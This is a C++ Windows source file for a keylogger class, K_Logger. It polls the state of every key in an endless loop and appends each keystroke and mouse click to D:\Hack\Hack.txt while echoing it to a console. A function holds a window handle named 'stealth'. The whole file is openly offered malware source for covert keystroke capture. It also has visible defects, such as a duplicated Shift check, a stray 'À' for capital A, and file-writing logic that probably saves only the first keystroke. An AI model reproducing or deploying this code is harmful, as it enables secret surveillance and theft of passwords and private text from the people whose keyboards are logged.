#include "basic_func.h"

/*******************************************************************/

/* Date: 10.06.2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright: 2018 Artem Gord1728. All rights reserved.            */

/* Description: Code with basic functionality                      */

/*******************************************************************/




void K_Logger::WriteToDoc(LPCSTR text)
{
	std::ofstream doc_to;
	LPCSTR fileName = "D:\\Hack";
	LPCSTR fileNameTo = "D:\\Hack\\Hack.txt";
	

	if (CreateDirectory(fileName, NULL))
	{
		if (CreateFile(fileNameTo, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_ARCHIVE, NULL))
		{
			doc_to.open(fileNameTo, std::fstream::app);
			doc_to << text;
			doc_to.close();	
		}
	}
}

int K_Logger::SaveSymbol(WORD iKey)
{
	switch (iKey)
	{
	case 48:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << ")";
			WriteToDoc(")");
		}
		else
		{
			std::cout << "0";
			WriteToDoc("0");
		}
		break;

	case 49:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "!";
			WriteToDoc("!");
		}
		else
		{
			std::cout << "1";
			WriteToDoc("1");
		}
		break;

	case 50:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "@";
			WriteToDoc("@");
		}
		else
		{
			std::cout << "2";
			WriteToDoc("2");
		}
		break;

	case 51:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "#";
			WriteToDoc("#");
		}
		else
		{
			std::cout << "3";
			WriteToDoc("3");
		}
		break;

	case 52:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "$";
			WriteToDoc("$");
		}
		else
		{
			std::cout << "4";
			WriteToDoc("4");
		}
		break;

	case 53:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "%";
			WriteToDoc("%");
		}
		else
		{
			std::cout << "5";
			WriteToDoc("5");
		}
		break;

	case 54:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "^";
			WriteToDoc("^");
		}
		else
		{
			std::cout << "6";
			WriteToDoc("6");
		}
		break;

	case 55:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "&";
			WriteToDoc("&");
		}
		else
		{
			std::cout << "7";
			WriteToDoc("7");
		}
		break;

	case 56:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "*";
			WriteToDoc("*");
		}
		else
		{
			std::cout << "8";
			WriteToDoc("8");
		}
		break;

	case 57:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "(";
			WriteToDoc("(");
		}
		else
		{
			std::cout << "9";
			WriteToDoc("9");
		}
		break;

	case 65:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "À";
			WriteToDoc("À");
		}
		else
		{
			std::cout << "a";
			WriteToDoc("a");
		}
		break;

	case 66:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "B";
			WriteToDoc("B");
		}
		else
		{
			std::cout << "b";
			WriteToDoc("b");
		}
		break;

	case 67:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "C";
			WriteToDoc("C");
		}
		else
		{
			std::cout << "c";
			WriteToDoc("c");
		}
		break;

	case 68:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "D";
			WriteToDoc("D");
		}
		else
		{
			std::cout << "d";
			WriteToDoc("d");
		}
		break;

	case 69:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "E";
			WriteToDoc("E");
		}
		else
		{
			std::cout << "e";
			WriteToDoc("e");
		}
		break;

	case 70:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "F";
			WriteToDoc("F");
		}
		else
		{
			std::cout << "f";
			WriteToDoc("f");
		}
		break;

	case 71:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "G";
			WriteToDoc("G");
		}
		else
		{
			std::cout << "g";
			WriteToDoc("g");
		}
		break;

	case 72:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "H";
			WriteToDoc("H");
		}
		else
		{
			std::cout << "h";
			WriteToDoc("h");
		}
		break;

	case 73:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "I";
			WriteToDoc("I");
		}
		else
		{
			std::cout << "i";
			WriteToDoc("i");
		}
		break;

	case 74:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "J";
			WriteToDoc("J");
		}
		else
		{
			std::cout << "j";
			WriteToDoc("j");
		}
		break;


	case 75:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "K";
			WriteToDoc("K");
		}
		else
		{
			std::cout << "k";
			WriteToDoc("k");
		}
		break;


	case 76:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "L";
			WriteToDoc("L");
		}
		else
		{
			std::cout << "l";
			WriteToDoc("l");
		}
		break;

	case 77:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "M";
			WriteToDoc("M");
		}
		else
		{
			std::cout << "m";
			WriteToDoc("m");
		}
		break;


	case 78:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "N";
			WriteToDoc("N");
		}
		else
		{
			std::cout << "n";
			WriteToDoc("n");
		}
		break;

	case 79:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "O";
			WriteToDoc("O");
		}
		else
		{
			std::cout << "o";
			WriteToDoc("o");
		}
		break;

	case 80:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "P";
			WriteToDoc("P");
		}
		else
		{
			std::cout << "p";
			WriteToDoc("p");
		}
		break;

	case 81:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "Q";
			WriteToDoc("Q");
		}
		else
		{
			std::cout << "q";
			WriteToDoc("q");
		}
		break;

	case 82:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "R";
			WriteToDoc("R");
		}
		else
		{
			std::cout << "r";
			WriteToDoc("r");
		}
		break;

	case 83:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "S";
			WriteToDoc("S");
		}
		else
		{
			std::cout << "s";
			WriteToDoc("s");
		}
		break;

	case 84:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "T";
			WriteToDoc("T");
		}
		else
		{
			std::cout << "t";
			WriteToDoc("t");
		}
		break;

	case 85:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "U";
			WriteToDoc("U");
		}
		else
		{
			std::cout << "u";
			WriteToDoc("u");
		}
		break;

	case 86:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "V";
			WriteToDoc("V");
		}
		else
		{
			std::cout << "v";
			WriteToDoc("v");
		}
		break;

	case 87:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "W";
			WriteToDoc("W");
		}
		else
		{
			std::cout << "w";
			WriteToDoc("w");
		}
		break;

	case 88:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "X";
			WriteToDoc("X");
		}
		else
		{
			std::cout << "x";
			WriteToDoc("x");
		}
		break;

	case 89:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "Y";
			WriteToDoc("Y");
		}
		else
		{
			std::cout << "y";
			WriteToDoc("y");
		}
		break;

	case 90:
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
		{
			std::cout << "Z";
			WriteToDoc("Z");
		}
		else
		{
			std::cout << "z";
			WriteToDoc("z");
		}
		break;




	case VK_F1:
		std::cout << "  *F1*  ";
		WriteToDoc("  *F1*  ");
		break;

	case VK_F2:
		std::cout << "  *F2*  ";
		WriteToDoc("  *F2*  ");
		break;

	case VK_F3:
		std::cout << "  *F3*  ";
		WriteToDoc("  *F3*  ");
		break;

	case VK_F4:
		std::cout << "  *F4*  ";
		WriteToDoc("  *F4*  ");
		break;

	case VK_F5:
		std::cout << "  *F5*  ";
		WriteToDoc("  *F5*  ");
		break;

	case VK_F6:
		std::cout << "  *F6*  ";
		WriteToDoc("  *F6*  ");
		break;

	case VK_F7:
		std::cout << "  *F7*  ";
		WriteToDoc("  *F7*  ");
		break;

	case VK_F8:
		std::cout << "  *F8*  ";
		WriteToDoc("  *F8*  ");
		break;

	case VK_F9:
		std::cout << "  *F9*  ";
		WriteToDoc("  *F9*  ");
		break;

	case VK_F10:
		std::cout << "  *F10*  ";
		WriteToDoc("  *F10*  ");
		break;

	case VK_F11:
		std::cout << "  *F11*  ";
		WriteToDoc("  *F11*  ");
		break;

	case VK_F12:
		std::cout << "  *F12*  ";
		WriteToDoc("  *F12*  ");
		break;

	case VK_END:
		std::cout << "  *END*  ";
		WriteToDoc("  *END*  ");
		break;

	case VK_HOME:
		std::cout << "  *HOME*  ";
		WriteToDoc("  *HOME*  ");
		break;

	case VK_NUMLOCK:
		std::cout << "  *Num_Lock*  ";
		WriteToDoc("  *Num_Lock*  ");
		break;

	case VK_RWIN:
		std::cout << "  *Right_Windows*  ";
		WriteToDoc("  *Right_Windows*  ");
		break;





		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	case VK_NUMPAD0:
		std::cout << "0";
		WriteToDoc("0");
		break;

	case VK_NUMPAD1:
		std::cout << "1";
		WriteToDoc("1");
		break;

	case VK_NUMPAD2:
		std::cout << "2";
		WriteToDoc("2");
		break;

	case VK_NUMPAD3:
		std::cout << "3";
		WriteToDoc("3");
		break;

	case VK_NUMPAD4:
		std::cout << "4";
		WriteToDoc("4");
		break;

	case VK_NUMPAD5:
		std::cout << "5";
		WriteToDoc("5");
		break;

	case VK_NUMPAD6:
		std::cout << "6";
		WriteToDoc("6");
		break;

	case VK_NUMPAD7:
		std::cout << "7";
		WriteToDoc("7");
		break;

	case VK_NUMPAD8:
		std::cout << "8";
		WriteToDoc("8");
		break;

	case VK_NUMPAD9:
		std::cout << "9";
		WriteToDoc("9");
		break;

	case VK_DECIMAL:
		std::cout << ".";
		WriteToDoc(".");
		break;

	case VK_SUBTRACT:
		std::cout << "-";
		WriteToDoc("-");
		break;

	case VK_MULTIPLY:
		std::cout << "*";
		WriteToDoc("*");
		break;

	case VK_DIVIDE:
		std::cout << "/";
		WriteToDoc("/");
		break;

	case VK_ADD:
		std::cout << "+";
		WriteToDoc("+");
		break;
		//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



	case VK_LWIN:
		std::cout << "Left_Win";
		WriteToDoc("Left_Win");
		break;


	case VK_SPACE:
		std::cout << " ";
		WriteToDoc(" ");
		break;

	case VK_TAB:
		std::cout << " *TAB* ";
		WriteToDoc(" *TAB* ");
		break;

	case VK_MBUTTON:
		std::cout << "  *mouse_middle-button*  ";
		WriteToDoc("  *mouse_middle-button*  ");
		break;

	case VK_MENU:
		std::cout << "  *Left_ALT*  ";
		WriteToDoc("  *Left_ALT*  ");
		break;

	case VK_SNAPSHOT:
		std::cout << "  *PRINT_SCREEN*  ";
		WriteToDoc("  *PRINT_SCREEN*  ");
		break;

	case VK_CAPITAL:
		std::cout << "  *CAPS_LOCK*  ";
		WriteToDoc("  *CAPS_LOCK*  ");
		break;

	case VK_RETURN:
		std::cout << "\n";
		WriteToDoc("\n");
		break;

	case VK_SHIFT:
		std::cout << " *Left_Shift* ";
		WriteToDoc(" *Left_Shift* ");
		break;

	case VK_RSHIFT:
		std::cout << " *Right_Shift* ";
		WriteToDoc(" *Right_Shift* ");
		break;

	case VK_BACK:
		std::cout << "\b";
		WriteToDoc("\b");
		break;

	case VK_PRIOR:
		std::cout << "  *PageUp*  ";
		WriteToDoc("  *PageUp*  ");
		break;

	case VK_NEXT:
		std::cout << "  *PageDown*  ";
		WriteToDoc("  *PageDown*  ");
		break;

	case VK_ESCAPE:
		std::cout << " *Esc* ";
		WriteToDoc(" *Esc* ");
		break;

	case VK_UP:
		std::cout << " btn_up ";
		WriteToDoc(" btn_up ");
		break;

	case VK_DOWN:
		std::cout << " btn_down ";
		WriteToDoc(" btn_down ");
		break;

	case VK_LEFT:
		std::cout << " btn_left ";
		WriteToDoc(" btn_left ");
		break;

	case VK_RIGHT:
		std::cout << " btn_right ";
		WriteToDoc(" btn_right ");
		break;

	case VK_CONTROL:
		std::cout << " btn_ctrl ";
		WriteToDoc(" btn_ctrl ");
		break;

	case VK_INSERT:
		std::cout << " Insert ";
		WriteToDoc(" Insert ");
		break;

	case VK_DELETE:
		std::cout << " *Delete* ";
		WriteToDoc(" Delete ");
		break;


	case VK_RBUTTON:
		std::cout << "*mouse_right*";
		WriteToDoc("*mouse_right*");
		break;

	case VK_LBUTTON:
		std::cout << "*mouse_left*";
		WriteToDoc("*mouse_left*");
		break;

	default:
		std::cout << "?";
		WriteToDoc("?");
		break;
	}
	return 0;
}

void K_Logger::VisibilityApp()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow", NULL);
	ShowWindow(stealth, 1);
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	K_Logger kl;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				kl.SaveSymbol(key);
			}
		}
	}
	system("pause");
	return 0;
}